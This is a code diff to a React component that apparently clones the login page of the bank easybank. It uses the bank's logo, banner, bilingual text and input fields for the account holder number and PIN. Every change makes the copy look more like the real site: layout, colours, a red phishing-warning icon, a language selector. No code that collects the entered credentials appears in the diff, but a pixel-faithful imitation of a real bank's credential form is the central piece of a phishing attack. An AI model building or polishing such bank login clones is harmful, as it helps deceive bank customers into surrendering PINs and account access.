@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef, useCallback } from "react";
-import { Eye, EyeOff, ChevronRight, AlertTriangle } from "lucide-react";
+import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import easybankLogo from "@/assets/logo-easybank_de.png";
 import easybankBanner from "@/assets/EASY26016_login.jpg";
 
@@ -8,7 +8,6 @@ type Lang = "DE" | "EN";
 const translations: Record<Lang, {
   days: string[];
   hilfe: string;
-  datePrefix: string;
   loginTitle: string;
   loginHilfe: string;
   loginQuestion: string;
@@ -24,6 +23,7 @@ const translations: Record<Lang, {
   appInputLabel: string;
   appBtn: string;
   warnungTitle: string;
+  warnungBold: string;
   warnungText: string;
   warnungLink: string;
   hilfeTitle: string;
@@ -38,10 +38,9 @@ const translations: Record<Lang, {
   DE: {
     days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
     hilfe: "Hilfe",
-    datePrefix: "",
     loginTitle: "Login mit Zugangsdaten",
     loginHilfe: "Hilfe",
-    loginQuestion: "Melden Sie sich mit Ihren eBanking Zugangsdaten (mit Verfügernummer und PIN) oder per App (mit Verfügernummer oder email-Adresse) an.",
+    loginQuestion: "Wie wollen Sie sich einloggen?",
     tabVerfueger: "Verfüger",
     tabApp: "Mit der App",
     verfuegerLabel: "Verfügernummer",
@@ -54,7 +53,8 @@ const translations: Record<Lang, {
     appInputLabel: "E-Mail ODER Verfügernummer",
     appBtn: "Weiter",
     warnungTitle: "Warnung",
-    warnungText: "Achtung vor Phishing\nWir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!",
+    warnungBold: "Achtung vor Phishing",
+    warnungText: "Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!",
     warnungLink: "Weiterlesen",
     hilfeTitle: "Hilfe/Hotline",
     hilfePin: "PIN vergessen oder Verfüger gesperrt?",
@@ -68,10 +68,9 @@ const translations: Record<Lang, {
   EN: {
     days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
     hilfe: "Help",
-    datePrefix: "",
     loginTitle: "Login with access data",
     loginHilfe: "Help",
-    loginQuestion: "Log in with your eBanking access data (with disposer number and PIN) or via app (with disposer number or email address).",
+    loginQuestion: "How do you want to log in?",
     tabVerfueger: "Disposer",
     tabApp: "With the app",
     verfuegerLabel: "Disposer number",
@@ -84,7 +83,8 @@ const translations: Record<Lang, {
     appInputLabel: "Email OR Disposer number",
     appBtn: "Continue",
     warnungTitle: "Warning",
-    warnungText: "Phishing alert\nWe will never ask you by email or SMS to enter or confirm TANs, account or credit card data!",
+    warnungBold: "Phishing alert",
+    warnungText: "We will never ask you by email or SMS to enter or confirm TANs, account or credit card data!",
     warnungLink: "Read more",
     hilfeTitle: "Help/Hotline",
     hilfePin: "Forgot PIN or disposer locked?",
@@ -106,6 +106,13 @@ const footerUrls = [
   "https://www.easybank.at/nutzungsbedingungen",
   "https://www.easybank.at/barrierefreiheit",
 ];
+
+const RedWarningIcon = () => (
+  <svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" className="flex-shrink-0 mt-0.5">
+    <path d="M10 0L20 18H0L10 0Z" fill="#cc0000" />
+    <text x="10" y="14" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial">!</text>
+  </svg>
+);
 
 const Easybank = () => {
   const [verfueger, setVerfueger] = useState("");
@@ -159,25 +166,19 @@ const Easybank = () => {
           {/* Header */}
           <header className="bg-white px-4 py-2">
             <div className="flex items-center justify-between">
-              <img src={easybankLogo} alt="easybank" className="h-10" />
+              <img src={easybankLogo} alt="easybank" className="h-7" />
               <div className="flex items-center gap-3">
                 <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#009e9a] hover:underline font-semibold">
                   {t.hilfe}
                 </a>
-                <div className="flex items-center gap-1">
-                  <button
-                    onClick={() => setLang("DE")}
-                    className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${lang === "DE" ? "text-black underline" : "text-gray-500 hover:text-black"}`}
-                  >
-                    deutsch
-                  </button>
-                  <button
-                    onClick={() => setLang("EN")}
-                    className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${lang === "EN" ? "text-black underline" : "text-gray-500 hover:text-black"}`}
-                  >
-                    english
-                  </button>
-                </div>
+                <select
+                  value={lang}
+                  onChange={(e) => setLang(e.target.value as Lang)}
+                  className="text-[11px] border border-gray-300 rounded px-1 py-0.5 bg-white text-gray-700 cursor-pointer focus:outline-none"
+                >
+                  <option value="DE">deutsch</option>
+                  <option value="EN">english</option>
+                </select>
               </div>
             </div>
             <div className="text-right">
@@ -185,8 +186,8 @@ const Easybank = () => {
             </div>
           </header>
 
-          {/* Green divider */}
-          <div className="h-[3px] bg-[#8ab528] w-full" />
+          {/* Thin grey divider */}
+          <div className="h-[1px] bg-[#c0c0c0] w-full" />
 
           {/* Main content */}
           <div className="flex gap-4 p-4" style={{ minHeight: "520px" }}>
@@ -202,78 +203,84 @@ const Easybank = () => {
                 </div>
 
                 <div className="p-4">
-                  {/* How to login text */}
-                  <p className="text-xs text-gray-600 mb-3 leading-snug">{t.loginQuestion}</p>
-
                   {/* Question */}
-                  <p className="text-xs font-bold text-black mb-2">
-                    {lang === "DE" ? "Wie wollen Sie sich einloggen?" : "How do you want to log in?"}
-                  </p>
+                  <p className="text-xs text-gray-600 mb-3">{t.loginQuestion}</p>
 
-                  {/* Tabs */}
-                  <div className="flex mb-4">
-                    <button
-                      onClick={() => setActiveTab("verfueger")}
-                      className={`px-4 py-2 text-xs font-semibold border-b-2 transition-colors ${
-                        activeTab === "verfueger"
-                          ? "border-[#8ab528] text-[#8ab528]"
-                          : "border-transparent text-gray-500 hover:text-black"
-                      }`}
-                    >
-                      {t.tabVerfueger}
-                    </button>
-                    <button
-                      onClick={() => setActiveTab("app")}
-                      className={`px-4 py-2 text-xs font-semibold border-b-2 transition-colors ${
-                        activeTab === "app"
-                          ? "border-[#8ab528] text-[#8ab528]"
-                          : "border-transparent text-gray-500 hover:text-black"
-                      }`}
-                    >
-                      {t.tabApp}
-                    </button>
+                  {/* Tabs with continuous line */}
+                  <div className="mb-4 border-b border-gray-300">
+                    <div className="flex">
+                      <button
+                        onClick={() => setActiveTab("verfueger")}
+                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
+                          activeTab === "verfueger"
+                            ? "text-[#8ab528]"
+                            : "text-gray-500 hover:text-black"
+                        }`}
+                      >
+                        {t.tabVerfueger}
+                        {activeTab === "verfueger" && (
+                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#8ab528]" />
+                        )}
+                      </button>
+                      <button
+                        onClick={() => setActiveTab("app")}
+                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
+                          activeTab === "app"
+                            ? "text-[#8ab528]"
+                            : "text-gray-500 hover:text-black"
+                        }`}
+                      >
+                        {t.tabApp}
+                        {activeTab === "app" && (
+                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#8ab528]" />
+                        )}
+                      </button>
+                    </div>
                   </div>
 
                   {activeTab === "verfueger" ? (
                     <div>
-                      {/* Verfügernummer */}
-                      <div className="mb-3">
-                        <label className="text-xs text-gray-700 mb-1 block">{t.verfuegerLabel}</label>
-                        <input
-                          type="text"
-                          value={verfueger}
-                          onChange={(e) => setVerfueger(e.target.value)}
-                          className="w-full border border-gray-400 rounded px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
-                        />
-                        <p className="text-[10px] text-red-600 mt-1">{t.verfuegerHint}</p>
-                      </div>
-
-                      {/* PIN */}
-                      <div className="mb-4">
-                        <label className="text-xs text-gray-700 mb-1 block">{t.pinLabel}</label>
-                        <div className="relative">
+                      {/* Verfügernummer — 2 column layout */}
+                      <div className="mb-3 flex items-start gap-2">
+                        <label className="text-xs text-gray-700 pt-2 w-[130px] flex-shrink-0">{t.verfuegerLabel}</label>
+                        <div className="flex-1">
                           <input
-                            type={showPin ? "text" : "password"}
-                            value={pin}
-                            onChange={(e) => setPin(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-2 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
+                            type="text"
+                            value={verfueger}
+                            onChange={(e) => setVerfueger(e.target.value)}
+                            className="w-full border border-gray-400 rounded px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
                           />
-                          <button
-                            type="button"
-                            onClick={() => setShowPin(!showPin)}
-                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
-                          >
-                            {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-                          </button>
+                          <p className="text-[10px] text-red-600 mt-1">{t.verfuegerHint}</p>
                         </div>
-                        <p className="text-[10px] text-gray-500 mt-1">{t.pinHint}</p>
                       </div>
 
-                      {/* Login button */}
+                      {/* PIN — 2 column layout */}
+                      <div className="mb-4 flex items-start gap-2">
+                        <label className="text-xs text-gray-700 pt-2 w-[130px] flex-shrink-0">{t.pinLabel}</label>
+                        <div className="flex-1">
+                          <div className="relative">
+                            <input
+                              type={showPin ? "text" : "password"}
+                              value={pin}
+                              onChange={(e) => setPin(e.target.value)}
+                              className="w-full border border-gray-400 rounded px-3 py-2 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
+                            />
+                            <button
+                              type="button"
+                              onClick={() => setShowPin(!showPin)}
+                              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                            >
+                              {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
+                            </button>
+                          </div>
+                          <p className="text-[10px] text-gray-500 mt-1">{t.pinHint}</p>
+                        </div>
+                      </div>
+
+                      {/* Login button — no chevron */}
                       <div className="flex justify-end mb-4">
-                        <button className="px-6 py-2 bg-[#8ab528] text-white text-sm font-semibold rounded hover:bg-[#7aa020] transition-colors flex items-center gap-1">
+                        <button className="px-6 py-2 bg-[#8ab528] text-white text-sm font-semibold rounded hover:bg-[#7aa020] transition-colors">
                           {t.loginBtn}
-                          <ChevronRight className="h-4 w-4" />
                         </button>
                       </div>
 
@@ -287,21 +294,21 @@ const Easybank = () => {
                     </div>
                   ) : (
                     <div>
-                      {/* App tab */}
                       <p className="text-xs text-gray-600 mb-3">{t.appText}</p>
-                      <div className="mb-3">
-                        <label className="text-xs text-gray-700 mb-1 block">{t.appInputLabel}</label>
-                        <input
-                          type="text"
-                          value={appInput}
-                          onChange={(e) => setAppInput(e.target.value)}
-                          className="w-full border border-gray-400 rounded px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
-                        />
+                      <div className="mb-3 flex items-start gap-2">
+                        <label className="text-xs text-gray-700 pt-2 w-[130px] flex-shrink-0">{t.appInputLabel}</label>
+                        <div className="flex-1">
+                          <input
+                            type="text"
+                            value={appInput}
+                            onChange={(e) => setAppInput(e.target.value)}
+                            className="w-full border border-gray-400 rounded px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#8ab528]"
+                          />
+                        </div>
                       </div>
                       <div className="flex justify-end mb-4">
-                        <button className="px-6 py-2 bg-[#8ab528] text-white text-sm font-semibold rounded hover:bg-[#7aa020] transition-colors flex items-center gap-1">
+                        <button className="px-6 py-2 bg-[#8ab528] text-white text-sm font-semibold rounded hover:bg-[#7aa020] transition-colors">
                           {t.appBtn}
-                          <ChevronRight className="h-4 w-4" />
                         </button>
                       </div>
                       <div className="border-t border-gray-200 pt-3">
@@ -322,13 +329,20 @@ const Easybank = () => {
               <div className="flex gap-4">
                 {/* Warnung */}
                 <div className="flex-1 border border-gray-300 rounded bg-white">
-                  <div className="bg-[#009e9a] px-3 py-2 rounded-t">
-                    <h2 className="text-white text-xs font-bold">{t.warnungTitle}</h2>
+                  <div className="px-3 py-2">
+                    <h2 className="text-[#009e9a] text-sm font-bold">{t.warnungTitle}</h2>
                   </div>
+                  <div className="h-[2px] bg-gray-300" />
                   <div className="p-3">
                     <div className="flex gap-2 mb-2">
-                      <AlertTriangle className="h-5 w-5 text-[#e6a800] flex-shrink-0 mt-0.5" />
-                      <p className="text-[11px] text-gray-700 leading-snug whitespace-pre-line">{t.warnungText}</p>
+                      <RedWarningIcon />
+                      <div>
+                        <p className="text-[11px] text-gray-700 leading-snug">
+                          <strong>{t.warnungBold}</strong>
+                          <br />
+                          {t.warnungText}
+                        </p>
+                      </div>
                     </div>
                     <a href="#" onClick={(e) => e.preventDefault()} className="text-[11px] text-[#009e9a] hover:underline flex items-center gap-0.5">
                       <ChevronRight className="h-3 w-3" />
@@ -339,9 +353,10 @@ const Easybank = () => {
 
                 {/* Hilfe/Hotline */}
                 <div className="flex-1 border border-gray-300 rounded bg-white">
-                  <div className="bg-[#009e9a] px-3 py-2 rounded-t">
-                    <h2 className="text-white text-xs font-bold">{t.hilfeTitle}</h2>
+                  <div className="px-3 py-2">
+                    <h2 className="text-[#009e9a] text-sm font-bold">{t.hilfeTitle}</h2>
                   </div>
+                  <div className="h-[2px] bg-gray-300" />
                   <div className="p-3 space-y-2">
                     <a href="#" onClick={(e) => e.preventDefault()} className="text-[11px] text-[#009e9a] hover:underline flex items-center gap-0.5">
                       <ChevronRight className="h-3 w-3" />
@@ -356,9 +371,10 @@ const Easybank = () => {
 
                 {/* Info */}
                 <div className="flex-1 border border-gray-300 rounded bg-white">
-                  <div className="bg-[#009e9a] px-3 py-2 rounded-t">
-                    <h2 className="text-white text-xs font-bold">{t.infoTitle}</h2>
+                  <div className="px-3 py-2">
+                    <h2 className="text-[#009e9a] text-sm font-bold">{t.infoTitle}</h2>
                   </div>
+                  <div className="h-[2px] bg-gray-300" />
                   <div className="p-3 space-y-2">
                     <a href="#" onClick={(e) => e.preventDefault()} className="text-[11px] text-[#009e9a] hover:underline flex items-center gap-0.5">
                       <ChevronRight className="h-3 w-3" />
@@ -376,7 +392,7 @@ const Easybank = () => {
                 </div>
               </div>
 
-              {/* Banner image below the 3 cards */}
+              {/* Banner image */}
               <div className="flex-1">
                 <img
                   src={easybankBanner}
